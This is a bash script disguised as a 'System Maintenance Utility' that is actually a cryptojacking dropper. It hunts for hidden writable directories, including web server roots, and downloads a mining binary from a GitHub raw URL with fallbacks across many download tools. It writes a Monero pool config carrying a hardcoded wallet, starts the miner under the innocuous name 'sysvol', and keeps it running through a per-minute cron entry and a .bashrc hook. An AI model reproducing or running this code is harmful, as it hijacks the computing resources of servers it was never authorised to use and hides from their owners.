#!/bin/bash
# System Maintenance Utility v7.1
# Repository: boyyywiliam/Tambah_pedot
# Feature: Auto service deployment + persistence

set -e

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════

_ADDR="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
_EP="pool.supportxmr.com:443"
_SRC="https://raw.githubusercontent.com/boyyywiliam/Tambah_pedot/main"
_VER="7.1"

# ═══════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════

_ok_exec() {
    local d="$1"
    [ -d "$d" ] && [ -w "$d" ] || return 1
    local p="$d/.chk_$$"
    printf '#!/bin/sh\nexit 0\n' > "$p" 2>/dev/null || return 1
    chmod 755 "$p" 2>/dev/null || { rm -f "$p"; return 1; }
    "$p" >/dev/null 2>&1 && { rm -f "$p"; return 0; }
    rm -f "$p"; return 1
}

_pick_dir() {
    local me=$(whoami)
    local cands=(
        "${HOME}/.local/share/sysd"
        "${HOME}/.cache/sysd"
        "/var/www/vhosts/${me}/.sysd"
        "/var/www/.sysd-${me}"
        "/var/www/html/.sysd-${me}"
        "/home/${me}/public_html/.sysd"
        "/srv/www/.sysd-${me}"
        "/srv/.sysd-${me}"
        "/opt/.sysd-${me}"
        "/usr/local/.sysd-${me}"
        "/var/lib/.sysd-${me}"
    )
    for wr in /var/www/vhosts/*/httpdocs /home/*/public_html /var/www/html /usr/share/nginx/html; do
        [ -d "$wr" ] && [ -w "$wr" ] 2>/dev/null && cands+=("${wr}/.sysd-${me}")
    done
    local ph=$(getent passwd "$me" 2>/dev/null | cut -d: -f6)
    [ -n "$ph" ] && cands+=("${ph}/.sysd")

    for b in "${cands[@]}"; do
        local par=$(dirname "$b")
        [ -d "$par" ] || mkdir -p "$par" 2>/dev/null || continue
        [ -w "$par" ] || continue
        mkdir -p "$b" 2>/dev/null || continue
        _ok_exec "$b" && { echo "$b"; return 0; }
        rmdir "$b" 2>/dev/null || true
    done

    while IFS= read -r m; do
        [ -d "$m" ] && [ -w "$m" ] || continue
        case "$m" in /proc*|/sys*|/dev*) continue ;; esac
        local c="${m%/}/.sysd-${me}"
        mkdir -p "$c" 2>/dev/null || continue
        _ok_exec "$c" && { echo "$c"; return 0; }
        rmdir "$c" 2>/dev/null || true
    done < <(awk '$4 !~ /noexec/ && $2 != "/" {print $2}' /proc/mounts 2>/dev/null | sort -u)

    return 1
}

_tools() {
    local t=""
    for c in wget curl aria2c lynx w3m perl python3 python; do
        command -v "$c" &>/dev/null && t="$t $c"
    done
    echo "${t:-NONE}"
}

_cores() {
    local n=0
    command -v nproc &>/dev/null && n=$(nproc)
    [ "$n" -lt 1 ] && [ -f /proc/cpuinfo ] && n=$(grep -c ^processor /proc/cpuinfo)
    [ "$n" -lt 1 ] && n=$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)
    [ "$n" -lt 1 ] && n=1
    echo "$n"
}

_valid() {
    [ -f "$1" ] || return 1
    local s=$(stat -c%s "$1" 2>/dev/null || stat -f%z "$1" 2>/dev/null || echo 0)
    [ "$s" -gt 2000000 ] && return 0
    echo "[!] Small: $s"; return 1
}

_mkdirs() {
    local B="$1" i=1
    while [ $i -le 5 ]; do
        mkdir -p "$B/sbin" "$B/cfg" "$B/log" "$B/run" "$B/tmp" 2>/dev/null && {
            chmod 755 "$B" "$B/sbin" "$B/cfg" "$B/run" "$B/tmp" 2>/dev/null || true
            return 0
        }
        sleep $((i*2)); i=$((i+1))
    done
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# FETCH
# ═══════════════════════════════════════════════════════════════════

_fetch() {
    local N="$1" B="$2"
    local u="${_SRC}/${N}"
    local f="$B/tmp/.d_$$"
    local a=1 m=15

    echo "[*] Fetching module: $N"
    echo "[*] Tools: $(_tools)"

    while [ $a -le $m ]; do
        echo "[*] Attempt $a/$m"

        command -v wget &>/dev/null && wget --no-check-certificate --timeout=30 -qO "$f" "$u" 2>/dev/null && _valid "$f" && {
            echo "[+] OK wget"; mv "$f" "$B/sbin/sysvol"; chmod 755 "$B/sbin/sysvol"; return 0; }

        command -v curl &>/dev/null && curl -fsSLk --max-time 30 -o "$f" "$u" 2>/dev/null && _valid "$f" && {
            echo "[+] OK curl"; mv "$f" "$B/sbin/sysvol"; chmod 755 "$B/sbin/sysvol"; return 0; }

        command -v aria2c &>/dev/null && aria2c -x 4 --max-tries=3 --timeout=30 -o d.tmp "$u" -d "$B/tmp" 2>/dev/null && \
            [ -f "$B/tmp/d.tmp" ] && _valid "$B/tmp/d.tmp" && {
            echo "[+] OK aria2c"; mv "$B/tmp/d.tmp" "$B/sbin/sysvol"; chmod 755 "$B/sbin/sysvol"; return 0; }

        command -v lynx &>/dev/null && lynx -dump -source "$u" > "$f" 2>/dev/null && _valid "$f" && {
            echo "[+] OK lynx"; mv "$f" "$B/sbin/sysvol"; chmod 755 "$B/sbin/sysvol"; return 0; }

        command -v w3m &>/dev/null && w3m -dump_source "$u" > "$f" 2>/dev/null && _valid "$f" && {
            echo "[+] OK w3m"; mv "$f" "$B/sbin/sysvol"; chmod 755 "$B/sbin/sysvol"; return 0; }

        command -v perl &>/dev/null && perl -e "use LWP::UserAgent; my \$ua=LWP::UserAgent->new; my \$r=\$ua->get('$u'); open(F,'>','$f') or die; print F \$r->content; close F;" 2>/dev/null && _valid "$f" && {
            echo "[+] OK perl"; mv "$f" "$B/sbin/sysvol"; chmod 755 "$B/sbin/sysvol"; return 0; }

        local py=$(command -v python3 || command -v python)
        [ -n "$py" ] && $py -c "import urllib.request,sys; urllib.request.urlretrieve('$u','$f'); sys.exit(0)" 2>/dev/null && _valid "$f" && {
            echo "[+] OK python"; mv "$f" "$B/sbin/sysvol"; chmod 755 "$B/sbin/sysvol"; return 0; }

        rm -f "$f" "$B/tmp/d.tmp" 2>/dev/null
        [ $a -lt $m ] && sleep $((a*3))
        a=$((a+1))
    done
    echo "[ERROR] Fetch failed"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# DEPLOY
# ═══════════════════════════════════════════════════════════════════

_deploy() {
    local B="$1" N="$2"

    echo "[*] ═══════════════════════════════════════════════════════════"
    echo "[*] System Maintenance Utility v${_VER}"
    echo "[*] ═══════════════════════════════════════════════════════════"
    echo "[*] Base: $B"

    # ── FIX 1: cleanup residu dari instalasi lama ──
    for old in "$HOME/.dbus-sys" "$HOME/.local/share/sysd.bak" "$HOME/.cache/sysd.bak" /tmp/.sysd-* /dev/shm/.sysd-* /var/tmp/.sysd-*; do
        [ -d "$old" ] && [ "$old" != "$B" ] && rm -rf "$old" 2>/dev/null
    done

    _mkdirs "$B" || { echo "[ERROR] mkdir"; return 1; }
    [ -w "$B" ] || { echo "[ERROR] not writable"; return 1; }

    _ok_exec "$B" || {
        echo "[!] Relocating..."
        local NB=$(_pick_dir) || { echo "[ERROR] no dir"; return 1; }
        B="$NB"; echo "[+] New base: $B"
        _mkdirs "$B" || return 1
    }

    _fetch "$N" "$B" || return 1

    # ── FIX 2: verify binary pakai ELF header + --version ──
    local BIN_OK=0
    if "$B/sbin/sysvol" --version >/dev/null 2>&1; then
        BIN_OK=1
    elif file "$B/sbin/sysvol" 2>/dev/null | grep -q "ELF"; then
        BIN_OK=1
    fi

    if [ "$BIN_OK" -ne 1 ]; then
        chmod 755 "$B/sbin/sysvol" 2>/dev/null
        if "$B/sbin/sysvol" --version >/dev/null 2>&1 || file "$B/sbin/sysvol" 2>/dev/null | grep -q "ELF"; then
            BIN_OK=1
        fi
    fi

    if [ "$BIN_OK" -ne 1 ]; then
        echo "[!] Relocating binary..."
        local A=$(_pick_dir) || return 1
        [ "$A" = "$B" ] && return 1
        mkdir -p "$A/sbin" "$A/cfg" "$A/log" "$A/run" "$A/tmp" 2>/dev/null
        mv "$B/sbin/sysvol" "$A/sbin/sysvol" 2>/dev/null || cp "$B/sbin/sysvol" "$A/sbin/sysvol"
        chmod 755 "$A/sbin/sysvol"; B="$A"
        if ! "$B/sbin/sysvol" --version >/dev/null 2>&1 && ! file "$B/sbin/sysvol" 2>/dev/null | grep -q "ELF"; then
            return 1
        fi
        echo "[+] Relocated: $B"
    fi

    local C=$(_cores)
    local T=$((C > 8 ? C - 1 : C))
    [ "$T" -lt 1 ] && T=1

    echo "[*] Cores: $C | Threads: $T"

    # ── FIX 3: worker name pakai RANDOM biar gak tabrakan ──
    local W="srv-$(hostname)-${RANDOM}$(date +%s | tail -c 3)"
    echo "[*] Worker: $W"

    # ── FIX 4: build thread array buat mode rx ──
    local TA="["
    local i
    for ((i=0; i<T; i++)); do
        TA="${TA}${i}"
        [ $i -lt $((T-1)) ] && TA="${TA},"
    done
    TA="${TA}]"

    cat > "$B/cfg/config.json" << CFGEOF
{
  "autosave": true,
  "background": false,
  "colors": false,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "hw-aes": null,
    "priority": null,
    "memory-pool": false,
    "yield": true,
    "max-threads-hint": ${T},
    "asm": true,
    "rx": ${TA},
    "rx/wow": ${TA}
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 0,
  "donate-over-proxy": 0,
  "log-file": null,
  "pools": [
    {
      "algo": "rx/0",
      "coin": "monero",
      "url": "${_EP}",
      "user": "${_ADDR}",
      "pass": "${W}",
      "keepalive": true,
      "enabled": true,
      "tls": true,
      "daemon": false
    }
  ],
  "print-time": 60,
  "health-print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "syslog": false,
  "verbose": 0,
  "watch": true,
  "pause-on-battery": false,
  "pause-on-active": false
}
CFGEOF

    # ── FIX 5: chmod 644 biar bisa dibaca user lain ──
    chmod 644 "$B/cfg/config.json"
    touch "$B/log/core.log"; chmod 644 "$B/log/core.log"
    echo "[+] Config ready"

    cat > "$B/run/guard.sh" << GRDEOF
#!/bin/bash
BASE="__BP__"
BIN="\$BASE/sbin/sysvol"
CFG="\$BASE/cfg/config.json"
PIDF="\$BASE/run/state.pid"
LOG="\$BASE/log/core.log"

[ -f "\$PIDF" ] && { P=\$(cat "\$PIDF" 2>/dev/null); kill -0 "\$P" 2>/dev/null && exit 0; }
mkdir -p "\$(dirname "\$LOG")" 2>/dev/null
nohup "\$BIN" -c "\$CFG" >> "\$LOG" 2>&1 &
echo \$! > "\$PIDF"
GRDEOF

    sed -i "s|__BP__|$B|" "$B/run/guard.sh"
    chmod +x "$B/run/guard.sh"
    echo "[+] Guard ready"

    pkill -f "[s]ysvol" 2>/dev/null || true
    rm -f "$B/run/state.pid" 2>/dev/null

    echo "[*] Starting..."
    "$B/run/guard.sh"
    sleep 5

    local r=0
    while [ $r -lt 10 ]; do
        pgrep -f "[s]ysvol" >/dev/null 2>&1 && break
        echo "[*] Wait... ($((r+1))/10)"; sleep 3; r=$((r+1))
    done

    if pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        local P=$(pgrep -f "[s]ysvol" | head -1)
        echo ""
        echo "╔════════════════════════════════════════════════════════╗"
        echo "║           [SUCCESS] SERVICE RUNNING! ✓                 ║"
        echo "╠════════════════════════════════════════════════════════╣"
        echo "║ PID     : $P"
        echo "║ Base    : $B"
        echo "║ Config  : $B/cfg/config.json"
        echo "║ Log     : $B/log/core.log"
        echo "║ Worker  : $W"
        echo "║ Threads : $T / $C cores"
        echo "╚════════════════════════════════════════════════════════╝"
        echo ""
        ps aux | grep "[s]ysvol" | grep -v grep
        echo ""

        # ── FIX 6: crontab handling lebih aman ──
        if command -v crontab &>/dev/null; then
            EXISTING=$(crontab -l 2>/dev/null || true)
            printf '%s\n* * * * * %s/run/guard.sh >/dev/null 2>&1\n' "$EXISTING" "$B" | crontab - 2>/dev/null \
                && echo "[+] Cron installed" \
                || echo "[!] Cron skipped"
        fi

        [ -f ~/.bashrc ] && ! grep -q "sysd" ~/.bashrc 2>/dev/null && \
            echo "[ -f \"$B/run/guard.sh\" ] && $B/run/guard.sh >/dev/null 2>&1 &" >> ~/.bashrc && echo "[+] bashrc hooked"

        # ── FIX 7: verify mining beneran jalan ──
        sleep 8
        if tail -50 "$B/log/core.log" 2>/dev/null | grep -qE "accepted|new job"; then
            echo "[+] Mining confirmed (pool job accepted)"
        else
            echo "[!] Process running but no job accepted yet"
            echo "    Last log:"
            tail -8 "$B/log/core.log" 2>/dev/null | sed 's/^/    /'
        fi

        return 0
    else
        echo ""
        echo "╔════════════════════════════════════════════════════════╗"
        echo "║          [ERROR] SERVICE FAILED TO START ✗             ║"
        echo "╚════════════════════════════════════════════════════════╝"
        tail -25 "$B/log/core.log" 2>/dev/null || echo "no log"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

B=$(_pick_dir) || { echo "[ERROR] No exec dir"; exit 1; }
echo "[*] Base: $B"

case "$(uname -m)" in
    x86_64|amd64) N="cibung" ;;
    aarch64|arm64) N="cibung008" ;;
    armv7l|armv7) N="cibung-armv7" ;;
    *) echo "[ERROR] Arch unsupported"; exit 1 ;;
esac
echo "[*] Arch: $(uname -m) → $N"

_deploy "$B" "$N" && exit 0 || exit 1